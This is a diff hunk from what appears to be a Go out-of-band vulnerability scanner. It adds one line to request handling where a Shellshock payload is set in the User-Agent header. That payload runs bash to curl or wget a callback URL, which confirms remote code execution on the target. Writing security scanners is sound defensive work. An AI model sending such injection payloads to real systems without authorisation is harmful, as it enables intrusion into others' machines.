@@ -115,6 +115,7 @@ func (s *OASTScanner) Run(ctx context.Context, targetID string, logFn LogFunc) e
 			// Shellshock RCE uses a separate token from the SSRF headers. Sharing
 			// one token used to mislabel a shell callback as blind_ssrf.
 			req.Header.Set("User-Agent", "() { :;}; /bin/bash -c 'curl -s "+rceCB+" || wget -q -O- "+rceCB+"'")
+			req = SkipRequestIdentity(req)
 			for k, v := range auth {
 				req.Header.Set(k, v)
 			}
